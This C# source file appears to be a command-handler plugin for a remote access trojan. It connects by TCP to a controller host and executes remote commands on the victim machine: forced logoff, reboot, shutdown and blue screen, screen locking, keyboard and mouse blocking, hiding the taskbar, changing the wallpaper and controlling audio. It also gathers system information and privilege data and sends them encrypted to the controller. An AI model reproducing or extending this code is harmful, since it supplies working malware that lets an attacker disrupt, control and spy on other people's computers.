using Shared;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        public async static Task Main(Host H, string HWID, object[] Param, Socket Base, string key, string BaseIP)
        {
            byte[] b;
            try
            {
                Socket S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse(H.host), H.port);
                S.Connect(ep);
                PacketType T = (PacketType)Param[0];
                Data D = new Data();
                D.HWID = HWID;
                D.IP_Origin = BaseIP;
                switch (T)
                {
                    case PacketType.LOG_OUT_SYS:
                        await Task.Run(() => Functions.PowerOptions(NativeAPI.Miscellaneous.EWX_LOGOFF, 0));
                        break;

                    case PacketType.REBOOT_SYS:
                        await Task.Run(() => Functions.PowerOptions(NativeAPI.Miscellaneous.EWX_REBOOT, 0 | NativeAPI.Miscellaneous.SHTDN_REASON_MINOR_BLUESCREEN));
                        break;

                    case PacketType.POWER_OFF_SYS:
                        await Task.Run(() => Functions.PowerOptions(NativeAPI.Miscellaneous.EWX_POWEROFF, 0 | NativeAPI.Miscellaneous.SHTDN_REASON_MAJOR_SOFTWARE));
                        break;

                    case PacketType.SUSPEND_SYS:
                        await Task.Run(() => Functions.Suspend());
                        break;

                    case PacketType.HIBERNATE_SYS:
                        await Task.Run(() => Functions.Hibernate());
                        break;

                    case PacketType.HIDE_DI:
                        await Task.Run(() => Functions.DesktopIcons(false));
                        break;

                    case PacketType.SHOW_DI:
                        await Task.Run(() => Functions.DesktopIcons(true));
                        break;

                    case PacketType.HIDE_TB:
                        await Task.Run(() => Functions.TaskBar(0));
                        break;

                    case PacketType.SHOW_TB:
                        await Task.Run(() => Functions.TaskBar(1));
                        break;

                    case PacketType.SCRL_ON:
                        await Task.Run(() => Functions.StartScreenLocker());
                        break;

                    case PacketType.SRCL_OFF:
                        await Task.Run(() => Functions.StopScreenLocker());
                        break;

                    case PacketType.BSOD_SYS:
                        await Task.Run(() => Functions.BSOD());
                        break;

                    case PacketType.KB_ON:
                        await Task.Run(() => Functions.UnhookKeyboard());
                        break;

                    case PacketType.KB_OFF:
                        await Task.Run(() => Functions.HookKeyboard());
                        break;

                    case PacketType.MS_ON:
                        await Task.Run(() => Functions.UnhookMouse());
                        break;

                    case PacketType.MS_OFF:
                        await Task.Run(() => Functions.HookMouse());
                        break;

                    case PacketType.SET_DESK_WP:
                        b = (byte[])Param[1];
                        await Task.Run(() => Functions.SetWallPaper(b , Param[2].ToString()));
                        break;

                    case PacketType.GET_PRIV:
                        await Task.Run(() => Functions.GetPrivilege((int)Param[1], ref D));
                        D.Type = PacketType.GET_PRIV;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;

                    case PacketType.MUTE_AUDIO:
                        await Task.Run(() => Functions.MuteSound());
                        break;

                    case PacketType.AUDIO_UP:
                        await Task.Run(() => Functions.SoundUp());
                        break;

                    case PacketType.AUDIO_DOWN:
                        await Task.Run(() => Functions.SoundDown());
                        break;

                    case PacketType.GET_INFORMATION:
                        b = (byte[])Param[1];
                        await Task.Run(() => Functions.GetInformation(ref b, ref D));
                        D.Type = Shared.PacketType.GET_INFORMATION;
                        await Task.Run(() => SendData(S, Encryption.RSMTool.RSMEncrypt(D.Serialize(), Encoding.Unicode.GetBytes(key))));
                        break;
                }
                S.Close();
                S.Dispose();
            }
            catch {}
            finally
            {
                Shared.Utils.ClearMem();
            }       
        }
    }
}
